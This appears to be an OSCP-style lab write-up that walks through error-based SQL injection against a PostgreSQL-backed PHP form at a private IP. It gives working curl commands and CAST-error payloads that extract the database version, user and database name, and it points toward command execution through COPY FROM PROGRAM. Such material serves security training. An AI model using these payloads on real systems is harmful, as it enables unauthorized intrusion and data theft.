# Database Basics Enumeration
**Target**: 192.168.145.49 | **Injection Point**: POST parameter `height`

---

## 1. PostgreSQL Version Discovery

### Current Thinking
**Why this first?** Database version reveals:
- Available exploitation functions (`pg_read_file` needs v9.1+, `COPY FROM PROGRAM` needs v9.3+)
- Known CVEs for privilege escalation paths
- OS/architecture information (x86_64 vs ARM, Debian vs RedHat)
- Compatibility of advanced payloads

**OSCP Exam Relevance**: Version info determines which RCE techniques will work.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com"
```

**Why these parameters?**
- `weight=75&age=25&gender=male&email=test@test.com`: Keep other POST parameters valid (avoid application errors)
- `height=1'`: The vulnerable injection point

---

### Result Found
```
PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu,
compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
```

**Key Intelligence**:
- ✅ PostgreSQL 13.7 (modern version, all RCE functions available)
- ✅ Debian-based system (likely standard package paths)
- ✅ x86_64 architecture (common exploitation tools compatible)

---

### Command Anatomy Breakdown

**Backend Query Context** (reconstructed from error behavior):
```sql
SELECT * FROM users WHERE height='[USER_INPUT]' AND email LIKE '%...%'
```

**Our Injection Payload Breakdown**:
```sql
height=1' AND 1=CAST((SELECT version()) AS int)--
```

**Step-by-step transformation**:

1. **`height=1'`** - Closes the original string literal
   ```sql
   WHERE height='1' [injection continues here]
   ```

2. **`AND 1=CAST((SELECT version()) AS int)`** - Forces type error
   - **In PostgreSQL**: `SELECT version()` returns TEXT type
   - **`CAST(... AS int)`** attempts conversion to INTEGER
   - **Result**: Throws error: `invalid input syntax for type integer: "PostgreSQL 13.7..."`
   - **Critical**: Error message **contains our data** (the version string)

3. **`--`** - SQL comment terminator
   - Ignores everything after in original query
   - Prevents syntax errors from leftover backend code

**Final executed query**:
```sql
SELECT * FROM users WHERE height='1' AND 1=CAST((SELECT version()) AS int)-- AND email LIKE '%...%'
```

**Why this works**:
- Query executes but fails during evaluation
- PostgreSQL returns error with **actual data** in error message
- PHP's `pg_query()` with `display_errors=1` shows error in HTML response
- We extract data from error output

---

## 2. Current Database User

### Current Thinking
**Why check user?** PostgreSQL privileges are user-based:
- **Superusers** can execute OS commands (`COPY FROM PROGRAM`)
- **Regular users** limited to data access only
- Determines if RCE is possible via SQL injection

**What to look for**: Username. Will check privileges in next step.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_user) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
rubben
```

**Intelligence**: Username is `rubben` (not common names like `postgres`, `www-data`). Custom user → check privileges next.

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT current_user) AS int)--
```

**In PostgreSQL**:
- `current_user` is a built-in constant (returns current session's username)
- No parentheses needed: `current_user` vs `version()` function
- Type: `NAME` (PostgreSQL internal type)
- `CAST(NAME AS int)` triggers error: `invalid input syntax for type integer: "rubben"`

**Alternative functions** (all return similar info):
```sql
SELECT user;                    -- Standard SQL
SELECT session_user;            -- Session owner
SELECT current_user;            -- Effective user (respects SET ROLE)
SELECT usename FROM pg_user WHERE usename=current_user;  -- From system catalog
```

**Why `current_user`?**: Most reliable, works in all PostgreSQL versions (8.0+).

---

## 3. Current Database Name

### Current Thinking
**Why database name?** Needed for:
- Targeting correct `information_schema` queries (database-specific tables)
- Crafting UNION queries with correct table paths
- Understanding application architecture (separate DBs for users/logs/etc?)

**Next steps depend on this**: We'll enumerate tables in THIS database.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_database()) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
glovedb
```

**Intelligence**: Custom database name `glovedb` (likely application-specific, not default `postgres` DB).

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT current_database()) AS int)--
```

**In PostgreSQL**:
- `current_database()` returns the name of the database we're connected to
- Type: `NAME`
- Error extraction: `invalid input syntax for type integer: "glovedb"`

**Backend query becomes**:
```sql
SELECT * FROM users WHERE height='1' AND 1=CAST((SELECT current_database()) AS int)--' AND ...
```

**Why this matters**:
- Confirms we're in application DB (not `postgres` maintenance DB)
- All subsequent `information_schema` queries will show tables from `glovedb`
- Table paths should be: `glovedb.public.tablename` (database.schema.table)

---

## 🎓 Key Learning Points

### Error-Based SQLi Pattern
All three queries follow same pattern:
```sql
1' AND 1=CAST((SELECT <data_function>) AS int)--
```

**Why this pattern works**:
1. **Closes original query** with `1'`
2. **Adds new condition** with `AND 1=...`
3. **Forces type mismatch** with `CAST(TEXT AS int)`
4. **Extracts via error message** shown by PHP
5. **Terminates cleanly** with `--` comment

### Manual Discovery Process
**In OSCP exam** (no automated tools):
1. Test for SQLi with `'` → Observe errors
2. Identify DB type from error message (`pg_query()` = PostgreSQL)
3. Research PostgreSQL error-based techniques
4. Test basic extraction: `SELECT 1` (should error: "invalid input...1")
5. Extract version → user → database → tables → columns → data

### Why Not UNION-based?
UNION requires:
- Knowing exact column count in original query
- Matching column types
- Output reflection in page HTML

Error-based advantages:
- Works with any column count
- Works without page output
- Data in error messages (visible even if HTML hidden)

---

## ⏱️ Time Tracking (OSCP Exam Planning)

- Version check: **1 minute**
- User check: **1 minute**
- Database check: **1 minute**
- **Total: 3 minutes** (basic reconnaissance phase)

**Next phase**: Privilege verification (superuser check) - **Critical for RCE path**
